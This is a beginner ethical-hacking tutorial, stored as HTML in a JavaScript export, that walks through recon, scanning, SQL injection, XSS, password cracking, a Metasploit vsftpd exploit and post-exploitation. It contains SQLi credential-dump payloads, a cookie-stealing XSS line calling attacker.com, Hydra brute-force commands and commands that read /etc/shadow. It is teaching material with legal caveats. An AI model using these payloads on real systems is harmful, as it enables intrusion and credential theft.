export const CONTENT = `
      <p>Ethical hacking — also called <strong>penetration testing</strong> or <strong>white-hat hacking</strong> — is the practice of legally breaking into systems to find vulnerabilities <em>before</em> malicious hackers do. It's one of the most in-demand skills in cybersecurity, and you don't need a CS degree to get started. This tutorial will take you from zero to running your first penetration test, step by step.</p>

      <h2>What is Ethical Hacking?</h2>
      <p>An ethical hacker does the same things a criminal hacker does — reconnaissance, scanning, exploitation — but with <strong>written permission</strong> from the system owner. The goal is to find and report vulnerabilities so they can be fixed, not exploited.</p>

      <!-- Ethical vs Malicious -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">Ethical Hacker vs Malicious Hacker</div>
        <div class="vs-cards">
          <div class="vs-card" style="border-color:#22c55e">
            <div class="vs-card-header" style="background:#22c55e">&#x1F9D1;&#x200D;&#x1F4BB; Ethical Hacker (White Hat)</div>
            <div class="vs-card-body">
              <div class="vs-row"><span class="vs-row-icon">&#x1F4DD;</span>Has written permission</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F3AF;</span>Goal: find &amp; report vulnerabilities</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F4CB;</span>Delivers a detailed report</div>
              <div class="vs-row"><span class="vs-row-icon">&#x2696;</span>Works within legal boundaries</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F4B0;</span>Gets paid by the organization</div>
            </div>
          </div>
          <div class="vs-badge">VS</div>
          <div class="vs-card" style="border-color:#ef4444">
            <div class="vs-card-header" style="background:#ef4444">&#x1F47E; Malicious Hacker (Black Hat)</div>
            <div class="vs-card-body">
              <div class="vs-row"><span class="vs-row-icon">&#x1F6AB;</span>No permission — unauthorized</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F4A3;</span>Goal: steal, damage, or extort</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F4B8;</span>Sells data on the dark web</div>
              <div class="vs-row"><span class="vs-row-icon">&#x26D4;</span>Violates laws (CFAA, CMA, etc.)</div>
              <div class="vs-row"><span class="vs-row-icon">&#x1F6A8;</span>Faces criminal prosecution</div>
            </div>
          </div>
        </div>
      </div>

      <h2>The 5 Phases of Penetration Testing</h2>
      <p>Every professional penetration test follows a structured methodology. Understanding these phases is the foundation of ethical hacking.</p>

      <!-- Pentest Phases Pipeline -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">The 5 Phases of a Penetration Test</div>
        <div class="pipeline">
          <div class="pipeline-step" style="background:#3b82f6;--i:0"><span class="pipeline-step-icon">&#x1F50D;</span>Recon<span class="pipeline-step-sub">Phase 1</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#a855f7;--i:1"><span class="pipeline-step-icon">&#x1F4E1;</span>Scanning<span class="pipeline-step-sub">Phase 2</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#ef4444;--i:2"><span class="pipeline-step-icon">&#x1F4A5;</span>Exploitation<span class="pipeline-step-sub">Phase 3</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#f97316;--i:3"><span class="pipeline-step-icon">&#x1F510;</span>Post-Exploit<span class="pipeline-step-sub">Phase 4</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#22c55e;--i:4"><span class="pipeline-step-icon">&#x1F4CB;</span>Reporting<span class="pipeline-step-sub">Phase 5</span></div>
        </div>
      </div>

      <h2>Setting Up Your Lab (Safely)</h2>
      <p><strong>IMPORTANT:</strong> Never hack systems you don't own or have written permission to test. Always practice in a safe lab environment. Here's how to set one up:</p>

      <!-- Lab Setup -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">Your Ethical Hacking Lab Setup</div>
        <div class="layer-diagram">
          <div class="layer-item" style="background:#3b82f6">Your Host Machine (Windows / macOS / Linux)<span class="layer-item-sub">Runs VirtualBox or VMware to host virtual machines</span></div>
          <div class="layer-item" style="background:#22c55e">Kali Linux VM (Attacker)<span class="layer-item-sub">Pre-loaded with 600+ hacking tools — your main workspace</span></div>
          <div class="layer-item" style="background:#ef4444">Vulnerable VMs (Targets)<span class="layer-item-sub">Metasploitable, DVWA, HackTheBox, TryHackMe — practice safely</span></div>
          <div class="layer-item" style="background:#7c3aed">Isolated Network (Host-Only)<span class="layer-item-sub">VMs talk to each other only — no traffic reaches the internet</span></div>
        </div>
      </div>

      <pre><code># Step 1: Install VirtualBox (free)
# Download from https://www.virtualbox.org/

# Step 2: Download Kali Linux VM image
# https://www.kali.org/get-kali/#kali-virtual-machines
# Default credentials: kali / kali

# Step 3: Download a vulnerable target VM
# Metasploitable 2: https://sourceforge.net/projects/metasploitable/
# Or use TryHackMe (browser-based, no VM needed): https://tryhackme.com

# Step 4: Configure networking
# In VirtualBox: Settings > Network > Attached to: "Host-only Adapter"
# This isolates your lab from the real network

# Step 5: Verify connectivity
ping 192.168.56.101   # Ping your target VM from Kali</code></pre>

      <h2>Phase 1: Reconnaissance (Information Gathering)</h2>
      <p>Before touching a target system, gather as much information as possible. This is called <strong>recon</strong> or <strong>OSINT</strong> (Open Source Intelligence). The more you know, the more targeted your attack can be.</p>

      <h2>Passive Reconnaissance</h2>
      <p>Passive recon means gathering information <em>without directly interacting</em> with the target. You're reading publicly available data — no laws broken, no alerts triggered.</p>
      <pre><code># WHOIS lookup — who owns the domain?
whois example.com
# Shows: registrant name, email, name servers, creation date

# DNS enumeration — discover subdomains and mail servers
dig example.com ANY
dig example.com MX          # Mail servers
dig example.com NS          # Name servers
host -t txt example.com     # TXT records (SPF, DKIM)

# Subdomain discovery
# Using Sublist3r (pre-installed on Kali)
sublist3r -d example.com
# Finds: mail.example.com, dev.example.com, staging.example.com, etc.

# Google Dorking — use Google to find exposed files
# site:example.com filetype:pdf        (find PDFs)
# site:example.com intitle:"index of"  (find directory listings)
# site:example.com inurl:admin         (find admin panels)
# site:example.com ext:sql             (find SQL files)

# Shodan — search engine for internet-connected devices
# https://www.shodan.io/search?query=hostname:example.com
# Shows: open ports, services, SSL certs, known vulnerabilities

# theHarvester — gather emails, names, subdomains
theHarvester -d example.com -b google,linkedin,dnsdumpster</code></pre>

      <h2>Active Reconnaissance</h2>
      <p>Active recon involves <strong>directly interacting</strong> with the target — sending packets, making requests. This can be detected by the target's security systems.</p>
      <pre><code># Ping sweep — which hosts are alive on the network?
nmap -sn 192.168.56.0/24
# Output: Host 192.168.56.101 is up (0.0012s latency)

# Banner grabbing — what software is running?
nc -v 192.168.56.101 80
# Then type: HEAD / HTTP/1.1
# Response reveals: Apache/2.4.7, PHP/5.5.9, Ubuntu

# Traceroute — map the network path
traceroute example.com</code></pre>

      <h2>Phase 2: Scanning &amp; Enumeration</h2>
      <p>Now we actively probe the target to discover open ports, running services, and potential vulnerabilities. <strong>Nmap</strong> is the most important tool here.</p>

      <!-- Scanning Tools -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">Essential Scanning Tools</div>
        <div class="hub-apps" style="max-width:600px;margin:0 auto">
          <div class="hub-app" style="animation-delay:0.1s"><span class="hub-app-icon">&#x1F4E1;</span>Nmap<span class="hub-app-sub">Port scanner</span></div>
          <div class="hub-app" style="background:#a855f7;animation-delay:0.25s"><span class="hub-app-icon">&#x1F578;</span>Nikto<span class="hub-app-sub">Web scanner</span></div>
          <div class="hub-app" style="background:#ef4444;animation-delay:0.4s"><span class="hub-app-icon">&#x1F4A3;</span>Nessus<span class="hub-app-sub">Vuln scanner</span></div>
          <div class="hub-app" style="animation-delay:0.55s"><span class="hub-app-icon">&#x1F50D;</span>Dirb<span class="hub-app-sub">Dir brute-forcer</span></div>
        </div>
      </div>

      <h2>Nmap — The Network Mapper</h2>
      <pre><code># Basic port scan (top 1000 ports)
nmap 192.168.56.101
# Output:
# PORT     STATE SERVICE
# 21/tcp   open  ftp
# 22/tcp   open  ssh
# 80/tcp   open  http
# 3306/tcp open  mysql

# Service version detection (-sV) + OS detection (-O)
sudo nmap -sV -O 192.168.56.101
# Output:
# 21/tcp   open  ftp     vsftpd 2.3.4
# 22/tcp   open  ssh     OpenSSH 4.7p1
# 80/tcp   open  http    Apache httpd 2.2.8
# OS: Linux 2.6.X

# Aggressive scan (version + scripts + OS + traceroute)
sudo nmap -A 192.168.56.101

# Scan ALL 65535 ports (slower but thorough)
sudo nmap -p- 192.168.56.101

# Vulnerability scan using Nmap scripts (NSE)
nmap --script vuln 192.168.56.101
# Checks for known CVEs in the detected services

# Stealth scan (SYN scan — doesn't complete TCP handshake)
sudo nmap -sS 192.168.56.101

# UDP scan (important — many services run on UDP)
sudo nmap -sU --top-ports 50 192.168.56.101

# Output to file for later analysis
nmap -sV -oN scan-results.txt 192.168.56.101</code></pre>

      <h2>Web Application Scanning</h2>
      <pre><code># Nikto — web vulnerability scanner
nikto -h http://192.168.56.101
# Checks for: outdated software, dangerous files, misconfigurations
# Output: + Server: Apache/2.2.8
#         + /phpinfo.php: PHP info file found
#         + /admin/: Admin directory found

# Directory brute-forcing with Dirb
dirb http://192.168.56.101 /usr/share/wordlists/dirb/common.txt
# Discovers hidden directories: /admin, /backup, /config, /uploads

# Gobuster (faster alternative to Dirb)
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt

# WPScan — WordPress-specific scanner
wpscan --url http://192.168.56.101/wordpress --enumerate u,vp,vt
# Enumerates: users, vulnerable plugins, vulnerable themes</code></pre>

      <h2>Phase 3: Exploitation</h2>
      <p>This is where you use the vulnerabilities discovered during scanning to gain access to the target system. <strong>Always do this in your lab, never on systems without permission.</strong></p>

      <!-- Common Vulnerabilities -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">OWASP Top 10 — Most Common Web Vulnerabilities</div>
        <div class="timeline">
          <div class="timeline-item" style="--c:#ef4444"><div class="timeline-item-title" style="color:#ef4444">1. Broken Access Control</div><div class="timeline-item-desc">Users accessing unauthorized data or functions</div></div>
          <div class="timeline-item" style="--c:#f97316"><div class="timeline-item-title" style="color:#f97316">2. Cryptographic Failures</div><div class="timeline-item-desc">Weak encryption, exposed sensitive data</div></div>
          <div class="timeline-item" style="--c:#a855f7"><div class="timeline-item-title" style="color:#a855f7">3. Injection (SQL, XSS, Command)</div><div class="timeline-item-desc">Untrusted input executed as code</div></div>
          <div class="timeline-item" style="--c:#3b82f6"><div class="timeline-item-title" style="color:#3b82f6">4. Insecure Design</div><div class="timeline-item-desc">Architectural flaws, missing threat modeling</div></div>
          <div class="timeline-item" style="--c:#22c55e"><div class="timeline-item-title" style="color:#22c55e">5. Security Misconfiguration</div><div class="timeline-item-desc">Default passwords, unnecessary features enabled</div></div>
          <div class="timeline-item" style="--c:#ec4899"><div class="timeline-item-title" style="color:#ec4899">6. Vulnerable Components</div><div class="timeline-item-desc">Outdated libraries with known CVEs</div></div>
          <div class="timeline-item" style="--c:#7c3aed"><div class="timeline-item-title" style="color:#7c3aed">7. Auth &amp; Session Failures</div><div class="timeline-item-desc">Weak passwords, broken session management</div></div>
        </div>
      </div>

      <h2>SQL Injection (SQLi) — Hands-On Example</h2>
      <p>SQL injection is one of the most dangerous and common vulnerabilities. It happens when user input is inserted directly into SQL queries without sanitization.</p>
      <pre><code># Vulnerable login form (PHP backend)
# The server runs this query:
# SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

# Normal login:
Username: admin
Password: password123
# Query: SELECT * FROM users WHERE username='admin' AND password='password123'

# SQL Injection attack:
Username: admin' --
Password: anything
# Query: SELECT * FROM users WHERE username='admin' --' AND password='anything'
# The -- comments out the password check!
# Result: Logged in as admin without knowing the password

# More SQLi payloads:
' OR '1'='1                    # Always true — dumps all rows
' UNION SELECT 1,2,3,4 --     # Extract data from other tables
' UNION SELECT username,password FROM users --  # Dump credentials</code></pre>

      <h2>Using SQLMap (Automated SQL Injection)</h2>
      <pre><code># SQLMap automates SQL injection testing
# Test a URL parameter for SQLi
sqlmap -u "http://192.168.56.101/page.php?id=1" --dbs
# --dbs: list all databases

# Dump a specific database
sqlmap -u "http://192.168.56.101/page.php?id=1" -D mydb --tables
# Lists all tables in 'mydb'

# Dump usernames and passwords
sqlmap -u "http://192.168.56.101/page.php?id=1" -D mydb -T users --dump
# Extracts all rows from the users table
# SQLMap will auto-detect and crack password hashes!</code></pre>

      <h2>Cross-Site Scripting (XSS)</h2>
      <p>XSS lets attackers inject malicious JavaScript into web pages viewed by other users.</p>
      <pre><code># Reflected XSS — input is reflected back without sanitization
# Vulnerable URL: http://example.com/search?q=USER_INPUT

# Test payload (shows an alert box):
http://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;

# Stored XSS — payload is saved in the database
# Example: a comment field that doesn't sanitize HTML
Comment: &lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;
# Every user who views this comment sends their cookies to the attacker

# DOM-based XSS — manipulating the page's JavaScript
# XSS Prevention:
# 1. Always escape/encode user output
# 2. Use Content-Security-Policy headers
# 3. Use HttpOnly cookies (can't be read by JavaScript)
# 4. Use frameworks that auto-escape (Angular, React do this by default)</code></pre>

      <h2>Password Cracking</h2>
      <pre><code># If you've obtained password hashes (from SQLi, file access, etc.)
# you can attempt to crack them offline

# Using John the Ripper
echo 'admin:5f4dcc3b5aa765d61d8327deb882cf99' > hashes.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# Output: password (admin)

# Using Hashcat (GPU-accelerated — much faster)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# -m 0: MD5 hash type
# -a 0: dictionary attack

# Brute-force SSH login with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
# Tries every password in rockyou.txt against SSH

# ⚠️ NEVER use these tools against systems without authorization
# These are for your lab environment only!</code></pre>

      <h2>Metasploit Framework</h2>
      <p><strong>Metasploit</strong> is the most widely-used penetration testing framework. It has thousands of exploits, payloads, and auxiliary modules.</p>
      <pre><code># Start Metasploit console
msfconsole

# Example: Exploiting vsftpd 2.3.4 backdoor (a famous vulnerability)
# This backdoor was discovered in 2011 — vsftpd 2.3.4 has a built-in
# backdoor that opens a shell on port 6200 when you login with a
# username ending in ":)"

msf6> search vsftpd
# Shows: exploit/unix/ftp/vsftpd_234_backdoor

msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set RHOSTS 192.168.56.101
msf6> set RPORT 21
msf6> exploit

# [*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
# [*] 192.168.56.101:21 - USER: 331 Please specify the password.
# [+] 192.168.56.101:21 - Backdoor service has been spawned
# [+] 192.168.56.101:21 - UID: uid=0(root)
# You now have a ROOT SHELL on the target machine!

whoami        # root
cat /etc/shadow  # Password hashes for all users
ifconfig      # Network configuration</code></pre>

      <h2>Phase 4: Post-Exploitation</h2>
      <p>After gaining access, the next phase is understanding the scope of the compromise — what data is accessible, can you move laterally, can you escalate privileges?</p>
      <pre><code># Linux privilege escalation checks
whoami                    # Current user
id                        # User ID and groups
uname -a                  # Kernel version (check for kernel exploits)
cat /etc/passwd           # All users on the system
cat /etc/shadow           # Password hashes (need root)
sudo -l                   # What can this user run as sudo?
find / -perm -4000 2>/dev/null  # Find SUID binaries (potential privesc)

# Check for interesting files
find / -name "*.conf" 2>/dev/null   # Config files (may contain passwords)
find / -name "*.bak" 2>/dev/null    # Backup files
cat ~/.bash_history                  # Command history (may reveal passwords)
env                                  # Environment variables (API keys, DB creds)

# Network enumeration (from inside the compromised machine)
ifconfig                  # Network interfaces
netstat -tulnp            # Open ports and connections
arp -a                    # Nearby machines on the network

# Windows post-exploitation
whoami /priv              # Check privileges
net user                  # List all users
net localgroup administrators  # Who's admin?
systeminfo                # OS details, hotfixes (missing patches = vulns)</code></pre>

      <h2>Phase 5: Reporting</h2>
      <p>The report is the most important deliverable. A pentest without a clear report is worthless. Here's the standard structure:</p>

      <!-- Report Structure -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">Penetration Test Report Structure</div>
        <div class="layer-diagram">
          <div class="layer-item" style="background:#3b82f6">Executive Summary<span class="layer-item-sub">Non-technical overview for management — risk level, key findings, business impact</span></div>
          <div class="layer-item" style="background:#7c3aed">Scope &amp; Methodology<span class="layer-item-sub">What was tested, what tools were used, testing timeline</span></div>
          <div class="layer-item" style="background:#ef4444">Findings (Critical &#x2192; Low)<span class="layer-item-sub">Each vulnerability: description, evidence (screenshots), CVSS score, affected systems</span></div>
          <div class="layer-item" style="background:#f97316">Remediation Recommendations<span class="layer-item-sub">Specific fixes for each finding — code changes, config updates, patches</span></div>
          <div class="layer-item" style="background:#22c55e">Appendices<span class="layer-item-sub">Raw scan output, full exploit logs, tool configurations</span></div>
        </div>
      </div>

      <pre><code># Vulnerability severity (CVSS scoring)
Critical (9.0-10.0): Remote code execution, auth bypass, data breach
High     (7.0-8.9):  SQL injection, privilege escalation, XSS (stored)
Medium   (4.0-6.9):  Information disclosure, CSRF, XSS (reflected)
Low      (0.1-3.9):  Missing headers, verbose errors, weak SSL ciphers
Info     (0.0):      Observations, best practices, no direct risk</code></pre>

      <h2>Essential Tools Cheat Sheet</h2>

      <!-- Tools Reference -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">Ethical Hacking Toolkit</div>
        <div style="overflow-x:auto">
          <table style="width:100%;border-collapse:collapse;font-size:0.78rem;min-width:500px">
            <thead>
              <tr>
                <th style="text-align:left;padding:0.6rem;background:#7c3aed;color:#fff;border-radius:0.4rem 0 0 0">Tool</th>
                <th style="text-align:left;padding:0.6rem;background:#7c3aed;color:#fff">Purpose</th>
                <th style="text-align:left;padding:0.6rem;background:#7c3aed;color:#fff;border-radius:0 0.4rem 0 0">Phase</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem 0.6rem;color:var(--foreground);font-weight:700">Nmap</td><td style="padding:0.5rem 0.6rem;color:var(--foreground)">Port scanning, service detection, OS fingerprinting</td><td style="padding:0.5rem 0.6rem;color:#a855f7;font-weight:600">Scanning</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem 0.6rem;color:var(--foreground);font-weight:700">Burp Suite</td><td style="padding:0.5rem 0.6rem;color:var(--foreground)">Web app proxy, intercepting/modifying HTTP requests</td><td style="padding:0.5rem 0.6rem;color:#a855f7;font-weight:600">Scanning</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem 0.6rem;color:var(--foreground);font-weight:700">SQLMap</td><td style="padding:0.5rem 0.6rem;color:var(--foreground)">Automated SQL injection testing</td><td style="padding:0.5rem 0.6rem;color:#ef4444;font-weight:600">Exploitation</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem 0.6rem;color:var(--foreground);font-weight:700">Metasploit</td><td style="padding:0.5rem 0.6rem;color:var(--foreground)">Exploitation framework with 2000+ exploits</td><td style="padding:0.5rem 0.6rem;color:#ef4444;font-weight:600">Exploitation</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem 0.6rem;color:var(--foreground);font-weight:700">Hydra</td><td style="padding:0.5rem 0.6rem;color:var(--foreground)">Brute-force login for SSH, FTP, HTTP, MySQL</td><td style="padding:0.5rem 0.6rem;color:#ef4444;font-weight:600">Exploitation</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem 0.6rem;color:var(--foreground);font-weight:700">John / Hashcat</td><td style="padding:0.5rem 0.6rem;color:var(--foreground)">Password hash cracking (CPU/GPU)</td><td style="padding:0.5rem 0.6rem;color:#ef4444;font-weight:600">Exploitation</td></tr>
              <tr style="border-bottom:1px solid var(--border)"><td style="padding:0.5rem 0.6rem;color:var(--foreground);font-weight:700">Wireshark</td><td style="padding:0.5rem 0.6rem;color:var(--foreground)">Network packet capture and analysis</td><td style="padding:0.5rem 0.6rem;color:#3b82f6;font-weight:600">Recon</td></tr>
              <tr><td style="padding:0.5rem 0.6rem;color:var(--foreground);font-weight:700">Gobuster / Dirb</td><td style="padding:0.5rem 0.6rem;color:var(--foreground)">Directory and file brute-forcing on web servers</td><td style="padding:0.5rem 0.6rem;color:#a855f7;font-weight:600">Scanning</td></tr>
            </tbody>
          </table>
        </div>
      </div>

      <h2>Where to Practice (Legally)</h2>
      <p>These platforms provide intentionally vulnerable environments for learning:</p>
      <ul>
        <li><strong>TryHackMe</strong> (tryhackme.com) — Browser-based, guided rooms, perfect for beginners. Free tier available.</li>
        <li><strong>HackTheBox</strong> (hackthebox.com) — More challenging, real-world-like machines. Great for intermediate learners.</li>
        <li><strong>DVWA</strong> (Damn Vulnerable Web App) — Self-hosted PHP app with adjustable difficulty levels.</li>
        <li><strong>OverTheWire</strong> (overthewire.org) — Linux command-line challenges (Bandit series is great for beginners).</li>
        <li><strong>PortSwigger Web Security Academy</strong> — Free labs for learning web vulnerabilities from the makers of Burp Suite.</li>
        <li><strong>PicoCTF</strong> — Capture The Flag competitions designed for students.</li>
        <li><strong>VulnHub</strong> — Download vulnerable VMs for your local lab.</li>
      </ul>

      <h2>Certifications Path</h2>

      <!-- Cert Path -->
      <div class="flow-diagram">
        <div class="flow-diagram-title">Ethical Hacking Certification Roadmap</div>
        <div class="pipeline">
          <div class="pipeline-step" style="background:#22c55e;--i:0"><span class="pipeline-step-icon">&#x1F331;</span>CompTIA<span class="pipeline-step-sub">Security+ (entry)</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#3b82f6;--i:1"><span class="pipeline-step-icon">&#x1F4BB;</span>CEH<span class="pipeline-step-sub">Certified Ethical Hacker</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#a855f7;--i:2"><span class="pipeline-step-icon">&#x1F3AF;</span>eJPT / PenTest+<span class="pipeline-step-sub">Hands-on pentesting</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#f97316;--i:3"><span class="pipeline-step-icon">&#x1F525;</span>OSCP<span class="pipeline-step-sub">Gold standard</span></div>
          <div class="pipeline-arrow">&#x2192;</div>
          <div class="pipeline-step" style="background:#ef4444;--i:4"><span class="pipeline-step-icon">&#x1F451;</span>OSCE / OSWE<span class="pipeline-step-sub">Expert level</span></div>
        </div>
      </div>

      <h2>Responsible Disclosure</h2>
      <p>If you find a vulnerability in a real system (even accidentally), follow <strong>responsible disclosure</strong>:</p>
      <ul>
        <li><strong>Don't exploit it</strong> beyond what's needed to confirm it exists.</li>
        <li><strong>Contact the organization</strong> directly (look for a security.txt file at /.well-known/security.txt or a bug bounty program).</li>
        <li><strong>Give them time</strong> to fix it (typically 90 days) before disclosing publicly.</li>
        <li><strong>Don't share the vulnerability</strong> with others before it's patched.</li>
        <li><strong>Many companies pay bounties</strong> — check HackerOne and Bugcrowd for active programs.</li>
      </ul>

      <h2>Legal &amp; Ethical Guidelines</h2>
      <ul>
        <li><strong>Always get written permission</strong> before testing any system. A verbal agreement is not enough.</li>
        <li><strong>Define the scope clearly</strong> — which systems, which methods, what time window.</li>
        <li><strong>Know your laws:</strong> CFAA (USA), Computer Misuse Act (UK), IT Act (India). Unauthorized access is a criminal offense everywhere.</li>
        <li><strong>Use your powers for good.</strong> The difference between a security professional and a criminal is permission and intent.</li>
      </ul>

      <p>Ethical hacking is one of the most rewarding career paths in tech. You get paid to think like a criminal, break into systems, and make the internet safer. Start with TryHackMe, build your lab, learn the tools, and practice every day. The cybersecurity industry has a massive talent shortage — your skills are needed.</p>
    `;
